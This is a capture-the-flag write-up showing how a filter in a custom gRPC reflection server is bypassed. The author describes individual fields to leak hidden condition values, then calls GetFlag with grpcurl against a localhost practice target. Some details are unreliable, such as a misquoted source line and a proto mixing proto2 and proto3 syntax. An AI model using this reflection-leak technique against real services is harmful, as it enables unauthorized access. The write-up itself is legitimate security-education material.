# Exploiting Restricted gRPC Reflection to Obtain the Flag


We are given only two partial source files:

- main.go
```go
package main

import (
	"context"
	"flag"
	"github.com/google/go-cmp/cmp"
	"google.golang.org/grpc"
	"google.golang.org/grpc/reflection/grpc_reflection_v1"
	"google.golang.org/protobuf/types/known/emptypb"
	"log"
	"net"
	"os"

	pb "ctf.nusgreyhats.org/sgrpc/flag"
)

// server is used to implement helloworld.GreeterServer.
type server struct {
	pb.UnimplementedFlagServer
}

func (s *server) Hello(_ context.Context, _ *emptypb.Empty) (*pb.HelloReply, error) {
	reply := "Hello from QuanYang"
	return &pb.HelloReply{Message: &reply}, nil
}

func (s *server) GetFlag(_ context.Context, in *pb.FlagRequest) (*pb.FlagReply, error) {
	flagValue := os.Getenv("FLAG")
	unauthorized := "unauthorized"
	if in.GetFirstCondition() != <redacted> || !cmp.Equal(in.GetSecondCondition(), <redacted>) || in.GetLastCondition() != <redacted> {
		return &pb.FlagReply{Flag: &unauthorized}, nil
	}
	return &pb.FlagReply{Flag: &flagValue}, nil
}

func main() {
	flag.Parse()
	lis, err := net.Listen("tcp", ":3335")
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}
	s := grpc.NewServer()
	pb.RegisterFlagServer(s, &server{})
	grpc_reflection_v1.RegisterServerReflectionServer(s, &restrictedReflectionServer{})
	log.Printf("server listening at %v", lis.Addr())
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}
```

- customreflect.go
```go
package main

import (
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/reflection/grpc_reflection_v1"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protodesc"
	"google.golang.org/protobuf/reflect/protoreflect"
	"google.golang.org/protobuf/reflect/protoregistry"
	"strings"
)

type restrictedReflectionServer struct {
	grpc_reflection_v1.UnimplementedServerReflectionServer
}

func (s *restrictedReflectionServer) FileDescWithDependencies(fd protoreflect.FileDescriptor, sentFileDescriptors map[string]bool) ([][]byte, error) {
	if fd.IsPlaceholder() {
		// If the given root file is a placeholder, treat it
		// as missing instead of serializing it.
		return nil, protoregistry.NotFound
	}
	var r [][]byte
	queue := []protoreflect.FileDescriptor{fd}
	for len(queue) > 0 {
		currentfd := queue[0]
		queue = queue[1:]
		if currentfd.IsPlaceholder() {
			// Skip any missing files in the dependency graph.
			continue
		}
		if sent := sentFileDescriptors[currentfd.Path()]; len(r) == 0 || !sent {
			sentFileDescriptors[currentfd.Path()] = true
			fdProto := protodesc.ToFileDescriptorProto(currentfd)
			currentfdEncoded, err := proto.Marshal(fdProto)
			if err != nil {
				return nil, err
			}
			r = append(r, currentfdEncoded)
		}
		for i := 0; i < currentfd.Imports().Len(); i++ {
			queue = append(queue, currentfd.Imports().Get(i))
		}
	}
	return r, nil
}

func (s *restrictedReflectionServer) FileDescEncodingContainingSymbol(name string, sentFileDescriptors map[string]bool) ([][]byte, error) {
	d, err := protoregistry.GlobalFiles.FindDescriptorByName(protoreflect.FullName(name))
	if err != nil {
		return nil, err
	}
	return s.FileDescWithDependencies(d.ParentFile(), sentFileDescriptors)
}

func (s *restrictedReflectionServer) ServerReflectionInfo(stream grpc_reflection_v1.ServerReflection_ServerReflectionInfoServer) error {
	sentFileDescriptors := make(map[string]bool)
	for {
		req, err := stream.Recv()
		if err != nil {
			return err
		}

		switch r := req.MessageRequest.(type) {
		case *grpc_reflection_v1.ServerReflectionRequest_FileContainingSymbol:
			// Allow describing request message types only
			if !isDisallowedMessage(r.FileContainingSymbol) {
				// Respond with file descriptor
				b, err := s.FileDescEncodingContainingSymbol(r.FileContainingSymbol, sentFileDescriptors)
				if err != nil {
					stream.Send(&grpc_reflection_v1.ServerReflectionResponse{
						ValidHost:       req.Host,
						OriginalRequest: req,
						MessageResponse: &grpc_reflection_v1.ServerReflectionResponse_ErrorResponse{
							ErrorResponse: &grpc_reflection_v1.ErrorResponse{
								ErrorCode:    int32(codes.NotFound),
								ErrorMessage: "Symbol not found",
							},
						},
					})
					continue
				}

				stream.Send(&grpc_reflection_v1.ServerReflectionResponse{
					ValidHost:       req.Host,
					OriginalRequest: req,
					MessageResponse: &grpc_reflection_v1.ServerReflectionResponse_FileDescriptorResponse{
						FileDescriptorResponse: &grpc_reflection_v1.FileDescriptorResponse{
							FileDescriptorProto: b,
						},
					},
				})
			} else {
				stream.Send(&grpc_reflection_v1.ServerReflectionResponse{
					ValidHost:       req.Host,
					OriginalRequest: req,
					MessageResponse: &grpc_reflection_v1.ServerReflectionResponse_ErrorResponse{
						ErrorResponse: &grpc_reflection_v1.ErrorResponse{
							ErrorCode:    int32(codes.PermissionDenied),
							ErrorMessage: "This reflection method is disabled",
						},
					},
				})
			}
		default:
			// Block all other reflection requests
			stream.Send(&grpc_reflection_v1.ServerReflectionResponse{
				ValidHost:       req.Host,
				OriginalRequest: req,
				MessageResponse: &grpc_reflection_v1.ServerReflectionResponse_ErrorResponse{
					ErrorResponse: &grpc_reflection_v1.ErrorResponse{
						ErrorCode:    int32(codes.PermissionDenied),
						ErrorMessage: "This reflection method is disabled",
					},
				},
			})
		}
	}
}

func isDisallowedMessage(symbol string) bool {
	parts := strings.Split(symbol, ".")
	if strings.Contains(strings.ToLower(parts[len(parts)-1]), "flag") {
		return true
	}
	return false
}
```

Many internal details, including the proto files and exact package names, were redacted or missing. This forced us to rely heavily on the reflection service and carefully crafted requests to leak information and reconstruct the proto to invoke the flag-retrieval method.


## Source Code Overview

1. main.go

- The main program imports a protobuf package "`ctf.nusgreyhats.org/sgrpc/flag`".
- It initializes the gRPC server and registers the custom reflection server (`restrictedReflectionServer`).
- The proto files and service definitions are not available, so we cannot directly compile or introspect the proto schema.

2. customreflect.go
- This file contains the restricted reflection server implementation.
- It overrides the gRPC reflection service to only allow certain requests.
- The key function is `ServerReflectionInfo`, which processes reflection requests over a bidirectional stream.

Key points:

- It allows reflection requests for file descriptors containing specific symbols, but blocks all other methods.
- The blocking is implemented in a switch statement with a default case that returns PermissionDenied with "This reflection method is disabled" for anything other than FileContainingSymbol requests.
- It also restricts symbols whose names (last part after .) contain "flag" (case-insensitive) by refusing to return their descriptors.

This partial whitelist mechanism severely limits the ability to enumerate services or methods using standard reflection.



## Recon

### How to Get the Package Name

- Since list or other reflection commands are blocked, we cannot enumerate services dynamically.
- We inspect main.go and see the imported proto path: "`ctf.nusgreyhats.org/sgrpc/flag`".
- From this, we deduce possible package names for protobuf as:

```
ctf.nusgreyhats.org.sgrpc.flag
sgrpc.flag
flag
```

By trial, `flag` turns out to be the correct package.


### How to Get the Service Name
- Since the proto files are missing and reflection is restricted, we cannot enumerate services dynamically.
- However, by examining the main.go source code (the only available server code), we see a line like:

```go
flag.RegisterFlagServer(grpcServer, &flag.Server{})
```

This reveals the service name is Flag, as it follows the standard gRPC convention where service registration is via `Register<ServiceName>Server`.

Combined with the package name inferred from the proto import path ("`ctf.nusgreyhats.org/sgrpc/flag`"), this confirms the full service as `flag.Flag`.



## Invoking the Hello Function

After determining the package and service name, we test connectivity with a simple call:

```bash
grpcurl -plaintext -proto flag.proto -d '{}' localhost:33202 flag.Flag/Hello
```

Response:

```json
{
  "message": "Hello from QuanYang"
}
```

This confirms:

- The package is flag.
- The service is Flag.
- The server is functional and responds correctly.

## Leak

### Why We Cannot Use `FlagRequest` Directly

The reflection server has this check in `isDisallowedMessage`:

```go
func isDisallowedMessage(symbol string) bool {
	parts := strings.Split(symbol, ".")
	if strings.Contains(strings.ToLower(parts[len(parts)-1]), "flag") {
		return true
	}
	return false
}
```

- It blocks symbols whose last component contains "`flag`".
- Since FlagRequest ends with "`Flag`", it is disallowed, and we cannot get its file descriptor directly.
- This means we cannot fetch the entire `FlagRequest` message descriptor at once.

### How to Leak All Values One by One

Because the reflection server restricts listing or describing full messages (it denies requests with `PermissionDenied` error), we cannot directly query or describe the entire message type `flag.FlagRequest`. Instead, we leak the values field by field by describing each field individually.

This works because the reflection server’s disallowed message check is based on the full symbol name ending with "`flag`" — for example, it blocks `flag.FlagRequest` but allows querying fields like `flag.FlagRequest.first_condition` since "`first_condition`" does not contain "`flag`" in its name.

The source code snippet that enforces this check:
```go
func isDisallowedMessage(symbol string) bool {
	parts := strings.Split(symbol, ".")
	if strings.Contains(strings.ToLower(parts[len(parts)-1]), "flag") {
		return true
	}
	return false
}
```

Since the last segment of the symbol is the field name, and the field names like "`first_condition`", "`second_condition`", and "`last_condition`" do not contain "`flag`", the server allows describing them individually.

Example commands to leak each field’s type and default value:

``` bash
grpcurl -plaintext localhost:33202 describe flag.FlagRequest.first_condition
# Output:
# flag.FlagRequest.first_condition is a field:
# required string first_condition = 2 [default = "TraLaLeRo TraLaLa"];

grpcurl -plaintext localhost:33202 describe flag.FlagRequest.second_condition
# Output:
# flag.FlagRequest.second_condition is a field:
# required bytes second_condition = 3 [default = "cafebabe"];

grpcurl -plaintext localhost:33202 describe flag.FlagRequest.last_condition
# Output:
# flag.FlagRequest.last_condition is a field:
# required fixed64 last_condition = 1 [default = 3141592654];
```

With these, we learn the types and default values for each field and can craft a valid proto message accordingly.

```proto
syntax = "proto3";

package flag;

message FlagRequest {
  required fixed64 last_condition = 1 [default = 3141592654];
  required string first_condition = 2 [default = "TraLaLeRo TraLaLa"];
  required bytes second_condition = 3 [default = "cafebabe"];
}

message FlagResponse {
  string flag = 1;
}

service Flag {
  rpc Hello (google.protobuf.Empty) returns (FlagResponse);
  rpc GetFlag (FlagRequest) returns (FlagResponse);
}
```

### Why We Need to Encode the bytes Value as Base64


- The `second_condition` field is a bytes type.
- When sending JSON data to gRPC via grpcurl, bytes fields must be base64-encoded.

https://protobuf.dev/programming-guides/json/
```
bytes	base64 string	"YWJjMTIzIT8kKiYoKSctPUB+"	JSON value will be the data encoded as a string using standard base64 encoding with paddings. Either standard or URL-safe base64 encoding with/without paddings are accepted.
```

- The default value "cafebabe".
- So we encode it as base64:
`cafebabe  (hex)  →  Y2FmZWJhYmU=  (base64)`
- Passing "`cafebabe`" as a plain string causes errors or unintended results.
- Passing "`Y2FmZWJhYmU=`" ensures the bytes value is correctly interpreted by the server.

## Invoking the `GetFlag` Function

Finally, with the proto reconstructed and values known, we call GetFlag with the correct parameters:

```bash
grpcurl -plaintext -proto flag.proto -d '{
  "first_condition": "TraLaLeRo TraLaLa",
  "second_condition": "Y2FmZWJhYmU=",
  "last_condition": 3141592654
}' localhost:33202 flag.Flag/GetFlag
```
Response:
```json
{
  "flag": "grey{r3fl3ct_th3_sch3m4}"
}
```